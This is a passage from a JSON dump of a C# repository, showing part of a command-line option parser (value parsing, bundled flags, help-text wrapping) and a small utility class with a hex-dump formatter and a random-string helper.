[\"sep\"].Value;\n\t\t\t\tvalue = m.Groups [\"value\"].Value;\n\t\t\t}\n\t\t\treturn true;\n\t\t}\n\n\t\tprotected virtual bool Parse (string argument, OptionContext c)\n\t\t{\n\t\t\tif (c.Option != null) {\n\t\t\t\tParseValue (argument, c);\n\t\t\t\treturn true;\n\t\t\t}\n\n\t\t\tstring f, n, s, v;\n\t\t\tif (!GetOptionParts (argument, out f, out n, out s, out v))\n\t\t\t\treturn false;\n\n\t\t\tOption p;\n\t\t\tif (Contains (n)) {\n\t\t\t\tp = this [n];\n\t\t\t\tc.OptionName = f + n;\n\t\t\t\tc.Option     = p;\n\t\t\t\tswitch (p.OptionValueType) {\n\t\t\t\t\tcase OptionValueType.None:\n\t\t\t\t\t\tc.OptionValues.Add (n);\n\t\t\t\t\t\tc.Option.Invoke (c);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase OptionValueType.Optional:\n\t\t\t\t\tcase OptionValueType.Required: \n\t\t\t\t\t\tParseValue (v, c);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\t// no match; is it a bool option?\n\t\t\tif (ParseBool (argument, n, c))\n\t\t\t\treturn true;\n\t\t\t// is it a bundled option?\n\t\t\tif (ParseBundledValue (f, string.Concat (n + s + v), c))\n\t\t\t\treturn true;\n\n\t\t\treturn false;\n\t\t}\n\n\t\tprivate void ParseValue (string option, OptionContext c)\n\t\t{\n\t\t\tif (option != null)\n\t\t\t\tforeach (string o in c.Option.ValueSeparators != null \n\t\t\t\t\t\t? option.Split (c.Option.ValueSeparators, StringSplitOptions.None)\n\t\t\t\t\t\t: new string[]{option}) {\n\t\t\t\t\tc.OptionValues.Add (o);\n\t\t\t\t}\n\t\t\tif (c.OptionValues.Count == c.Option.MaxValueCount || \n\t\t\t\t\tc.Option.OptionValueType == OptionValueType.Optional)\n\t\t\t\tc.Option.Invoke (c);\n\t\t\telse if (c.OptionValues.Count > c.Option.MaxValueCount) {\n\t\t\t\tthrow new OptionException (localizer (string.Format (\n\t\t\t\t\t\t\t\t\"Error: Found {0} option values when expecting {1}.\", \n\t\t\t\t\t\t\t\tc.OptionValues.Count, c.Option.MaxValueCount)),\n\t\t\t\t\t\tc.OptionName);\n\t\t\t}\n\t\t}\n\n\t\tprivate bool ParseBool (string option, string n, OptionContext c)\n\t\t{\n\t\t\tOption p;\n\t\t\tstring rn;\n\t\t\tif (n.Length >= 1 && (n [n.Length-1] == '+' || n [n.Length-1] == '-') &&\n\t\t\t\t\tContains ((rn = n.Substring (0, n.Length-1)))) {\n\t\t\t\tp = this [rn];\n\t\t\t\tstring v = n [n.Length-1] == '+' ? option : null;\n\t\t\t\tc.OptionName  = option;\n\t\t\t\tc.Option      = p;\n\t\t\t\tc.OptionValues.Add (v);\n\t\t\t\tp.Invoke (c);\n\t\t\t\treturn true;\n\t\t\t}\n\t\t\treturn false;\n\t\t}\n\n\t\tprivate bool ParseBundledValue (string f, string n, OptionContext c)\n\t\t{\n\t\t\tif (f != \"-\")\n\t\t\t\treturn false;\n\t\t\tfor (int i = 0; i < n.Length; ++i) {\n\t\t\t\tOption p;\n\t\t\t\tstring opt = f + n [i].ToString ();\n\t\t\t\tstring rn = n [i].ToString ();\n\t\t\t\tif (!Contains (rn)) {\n\t\t\t\t\tif (i == 0)\n\t\t\t\t\t\treturn false;\n\t\t\t\t\tthrow new OptionException (string.Format (localizer (\n\t\t\t\t\t\t\t\t\t\"Cannot bundle unregistered option '{0}'.\"), opt), opt);\n\t\t\t\t}\n\t\t\t\tp = this [rn];\n\t\t\t\tswitch (p.OptionValueType) {\n\t\t\t\t\tcase OptionValueType.None:\n\t\t\t\t\t\tInvoke (c, opt, n, p);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase OptionValueType.Optional:\n\t\t\t\t\tcase OptionValueType.Required: {\n\t\t\t\t\t\tstring v     = n.Substring (i+1);\n\t\t\t\t\t\tc.Option     = p;\n\t\t\t\t\t\tc.OptionName = opt;\n\t\t\t\t\t\tParseValue (v.Length != 0 ? v : null, c);\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tthrow new InvalidOperationException (\"Unknown OptionValueType: \" + p.OptionValueType);\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn true;\n\t\t}\n\n\t\tprivate static void Invoke (OptionContext c, string name, string value, Option option)\n\t\t{\n\t\t\tc.OptionName  = name;\n\t\t\tc.Option      = option;\n\t\t\tc.OptionValues.Add (value);\n\t\t\toption.Invoke (c);\n\t\t}\n\n\t\tprivate const int OptionWidth = 29;\n\n\t\tpublic void WriteOptionDescriptions (TextWriter o)\n\t\t{\n\t\t\tforeach (Option p in this) {\n\t\t\t\tint written = 0;\n\t\t\t\tif (!WriteOptionPrototype (o, p, ref written))\n\t\t\t\t\tcontinue;\n\n\t\t\t\tif (written < OptionWidth)\n\t\t\t\t\to.Write (new string (' ', OptionWidth - written));\n\t\t\t\telse {\n\t\t\t\t\to.WriteLine ();\n\t\t\t\t\to.Write (new string (' ', OptionWidth));\n\t\t\t\t}\n\n\t\t\t\tList<string> lines = GetLines (localizer (GetDescription (p.Description)));\n\t\t\t\to.WriteLine (lines [0]);\n\t\t\t\tstring prefix = new string (' ', OptionWidth+2);\n\t\t\t\tfor (int i = 1; i < lines.Count; ++i) {\n\t\t\t\t\to.Write (prefix);\n\t\t\t\t\to.WriteLine (lines [i]);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tbool WriteOptionPrototype (TextWriter o, Option p, ref int written)\n\t\t{\n\t\t\tstring[] names = p.Names;\n\n\t\t\tint i = GetNextOptionIndex (names, 0);\n\t\t\tif (i == names.Length)\n\t\t\t\treturn false;\n\n\t\t\tif (names [i].Length == 1) {\n\t\t\t\tWrite (o, ref written, \"  -\");\n\t\t\t\tWrite (o, ref written, names [0]);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tWrite (o, ref written, \"      --\");\n\t\t\t\tWrite (o, ref written, names [0]);\n\t\t\t}\n\n\t\t\tfor ( i = GetNextOptionIndex (names, i+1); \n\t\t\t\t\ti < names.Length; i = GetNextOptionIndex (names, i+1)) {\n\t\t\t\tWrite (o, ref written, \", \");\n\t\t\t\tWrite (o, ref written, names [i].Length == 1 ? \"-\" : \"--\");\n\t\t\t\tWrite (o, ref written, names [i]);\n\t\t\t}\n\n\t\t\tif (p.OptionValueType == OptionValueType.Optional ||\n\t\t\t\t\tp.OptionValueType == OptionValueType.Required) {\n\t\t\t\tif (p.OptionValueType == OptionValueType.Optional) {\n\t\t\t\t\tWrite (o, ref written, localizer (\"[\"));\n\t\t\t\t}\n\t\t\t\tWrite (o, ref written, localizer (\"=\" + GetArgumentName (0, p.MaxValueCount, p.Description)));\n\t\t\t\tstring sep = p.ValueSeparators != null && p.ValueSeparators.Length > 0 \n\t\t\t\t\t? p.ValueSeparators [0]\n\t\t\t\t\t: \" \";\n\t\t\t\tfor (int c = 1; c < p.MaxValueCount; ++c) {\n\t\t\t\t\tWrite (o, ref written, localizer (sep + GetArgumentName (c, p.MaxValueCount, p.Description)));\n\t\t\t\t}\n\t\t\t\tif (p.OptionValueType == OptionValueType.Optional) {\n\t\t\t\t\tWrite (o, ref written, localizer (\"]\"));\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn true;\n\t\t}\n\n\t\tstatic int GetNextOptionIndex (string[] names, int i)\n\t\t{\n\t\t\twhile (i < names.Length && names [i] == \"<>\") {\n\t\t\t\t++i;\n\t\t\t}\n\t\t\treturn i;\n\t\t}\n\n\t\tstatic void Write (TextWriter o, ref int n, string s)\n\t\t{\n\t\t\tn += s.Length;\n\t\t\to.Write (s);\n\t\t}\n\n\t\tprivate static string GetArgumentName (int index, int maxIndex, string description)\n\t\t{\n\t\t\tif (description == null)\n\t\t\t\treturn maxIndex == 1 ? \"VALUE\" : \"VALUE\" + (index + 1);\n\t\t\tstring[] nameStart;\n\t\t\tif (maxIndex == 1)\n\t\t\t\tnameStart = new string[]{\"{0:\", \"{\"};\n\t\t\telse\n\t\t\t\tnameStart = new string[]{\"{\" + index + \":\"};\n\t\t\tfor (int i = 0; i < nameStart.Length; ++i) {\n\t\t\t\tint start, j = 0;\n\t\t\t\tdo {\n\t\t\t\t\tstart = description.IndexOf (nameStart [i], j);\n\t\t\t\t} while (start >= 0 && j != 0 ? description [j++ - 1] == '{' : false);\n\t\t\t\tif (start == -1)\n\t\t\t\t\tcontinue;\n\t\t\t\tint end = description.IndexOf (\"}\", start);\n\t\t\t\tif (end == -1)\n\t\t\t\t\tcontinue;\n\t\t\t\treturn description.Substring (start + nameStart [i].Length, end - start - nameStart [i].Length);\n\t\t\t}\n\t\t\treturn maxIndex == 1 ? \"VALUE\" : \"VALUE\" + (index + 1);\n\t\t}\n\n\t\tprivate static string GetDescription (string description)\n\t\t{\n\t\t\tif (description == null)\n\t\t\t\treturn string.Empty;\n\t\t\tStringBuilder sb = new StringBuilder (description.Length);\n\t\t\tint start = -1;\n\t\t\tfor (int i = 0; i < description.Length; ++i) {\n\t\t\t\tswitch (description [i]) {\n\t\t\t\t\tcase '{':\n\t\t\t\t\t\tif (i == start) {\n\t\t\t\t\t\t\tsb.Append ('{');\n\t\t\t\t\t\t\tstart = -1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (start < 0)\n\t\t\t\t\t\t\tstart = i + 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase '}':\n\t\t\t\t\t\tif (start < 0) {\n\t\t\t\t\t\t\tif ((i+1) == description.Length || description [i+1] != '}')\n\t\t\t\t\t\t\t\tthrow new InvalidOperationException (\"Invalid option description: \" + description);\n\t\t\t\t\t\t\t++i;\n\t\t\t\t\t\t\tsb.Append (\"}\");\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tsb.Append (description.Substring (start, i - start));\n\t\t\t\t\t\t\tstart = -1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase ':':\n\t\t\t\t\t\tif (start < 0)\n\t\t\t\t\t\t\tgoto default;\n\t\t\t\t\t\tstart = i + 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tif (start < 0)\n\t\t\t\t\t\t\tsb.Append (description [i]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn sb.ToString ();\n\t\t}\n\n\t\tprivate static List<string> GetLines (string description)\n\t\t{\n\t\t\tList<string> lines = new List<string> ();\n\t\t\tif (string.IsNullOrEmpty (description)) {\n\t\t\t\tlines.Add (string.Empty);\n\t\t\t\treturn lines;\n\t\t\t}\n\t\t\tint length = 80 - OptionWidth - 2;\n\t\t\tint start = 0, end;\n\t\t\tdo {\n\t\t\t\tend = GetLineEnd (start, length, description);\n\t\t\t\tbool cont = false;\n\t\t\t\tif (end < description.Length) {\n\t\t\t\t\tchar c = description [end];\n\t\t\t\t\tif (c == '-' || (char.IsWhiteSpace (c) && c != '\\n'))\n\t\t\t\t\t\t++end;\n\t\t\t\t\telse if (c != '\\n') {\n\t\t\t\t\t\tcont = true;\n\t\t\t\t\t\t--end;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tlines.Add (description.Substring (start, end - start));\n\t\t\t\tif (cont) {\n\t\t\t\t\tlines [lines.Count-1] += \"-\";\n\t\t\t\t}\n\t\t\t\tstart = end;\n\t\t\t\tif (start < description.Length && description [start] == '\\n')\n\t\t\t\t\t++start;\n\t\t\t} while (end < description.Length);\n\t\t\treturn lines;\n\t\t}\n\n\t\tprivate static int GetLineEnd (int start, int length, string description)\n\t\t{\n\t\t\tint end = Math.Min (start + length, description.Length);\n\t\t\tint sep = -1;\n\t\t\tfor (int i = start; i < end; ++i) {\n\t\t\t\tswitch (description [i]) {\n\t\t\t\t\tcase ' ':\n\t\t\t\t\tcase '\\t':\n\t\t\t\t\tcase '\\v':\n\t\t\t\t\tcase '-':\n\t\t\t\t\tcase ',':\n\t\t\t\t\tcase '.':\n\t\t\t\t\tcase ';':\n\t\t\t\t\t\tsep = i;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase '\\n':\n\t\t\t\t\t\treturn i;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (sep == -1 || end == description.Length)\n\t\t\t\treturn end;\n\t\t\treturn sep;\n\t\t}\n\t}\n}\n\n"
        },
        {
          "name": "utils.cs",
          "type": "blob",
          "size": 2.3525390625,
          "content": "using System;\nusing System.Text;\nusing System.Linq;\n\nclass Utils\n{   \n\t// Copied from https://www.codeproject.com/Articles/36747/%2FArticles%2F36747%2FQuick-and-Dirty-HexDump-of-a-Byte-Array\n\tpublic static string HexDump(byte[] bytes, int bytesPerLine = 16)\n\t{\n\t\tif (bytes == null) return \"<null>\";\n\t\tint bytesLength = bytes.Length;\n\n\t\tchar[] HexChars = \"0123456789ABCDEF\".ToCharArray();\n\n\t\tint firstHexColumn =\n\t\t\t8                   // 8 characters for the address\n\t\t\t+ 3;                  // 3 spaces\n\n\t\tint firstCharColumn = firstHexColumn\n\t\t\t+ bytesPerLine * 3       // - 2 digit for the hexadecimal value and 1 space\n\t\t\t+ (bytesPerLine - 1) / 8 // - 1 extra space every 8 characters from the 9th\n\t\t\t+ 2;                  // 2 spaces \n\n\t\tint lineLength = firstCharColumn\n\t\t\t+ bytesPerLine           // - characters to show the ascii value\n\t\t\t+ Environment.NewLine.Length; // Carriage return and line feed (should normally be 2)\n\n\t\tchar[] line = (new String(' ', lineLength - Environment.NewLine.Length) + Environment.NewLine).ToCharArray();\n\t\tint expectedLines = (bytesLength + bytesPerLine - 1) / bytesPerLine;\n\t\tStringBuilder result = new StringBuilder(expectedLines * lineLength);\n\n\t\tfor (int i = 0; i < bytesLength; i += bytesPerLine)\n\t\t{\n\t\t\tline[0] = HexChars[(i >> 28) & 0xF];\n\t\t\tline[1] = HexChars[(i >> 24) & 0xF];\n\t\t\tline[2] = HexChars[(i >> 20) & 0xF];\n\t\t\tline[3] = HexChars[(i >> 16) & 0xF];\n\t\t\tline[4] = HexChars[(i >> 12) & 0xF];\n\t\t\tline[5] = HexChars[(i >> 8) & 0xF];\n\t\t\tline[6] = HexChars[(i >> 4) & 0xF];\n\t\t\tline[7] = HexChars[(i >> 0) & 0xF];\n\n\t\t\tint hexColumn = firstHexColumn;\n\t\t\tint charColumn = firstCharColumn;\n\n\t\t\tfor (int j = 0; j < bytesPerLine; j++)\n\t\t\t{\n\t\t\t\tif (j > 0 && (j & 7) == 0) hexColumn++;\n\t\t\t\tif (i + j >= bytesLength)\n\t\t\t\t{\n\t\t\t\t\tline[hexColumn] = ' ';\n\t\t\t\t\tline[hexColumn + 1] = ' ';\n\t\t\t\t\tline[charColumn] = ' ';\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tbyte b = bytes[i + j];\n\t\t\t\t\tline[hexColumn] = HexChars[(b >> 4) & 0xF];\n\t\t\t\t\tline[hexColumn + 1] = HexChars[b & 0xF];\n\t\t\t\t\tline[charColumn] = (b < 32 ? '·' : (char)b);\n\t\t\t\t}\n\t\t\t\thexColumn += 3;\n\t\t\t\tcharColumn++;\n\t\t\t}\n\t\t\tresult.Append(line);\n\t\t}\n\t\treturn result.ToString();\n\t}\n\t\n\tpublic static string RandomString(int length)\n\t{\n\t\tvar random = new Random();\n\t\tconst string chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n\t\treturn new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());\n\t}\n}"
        }
      ]
    }
  ]
}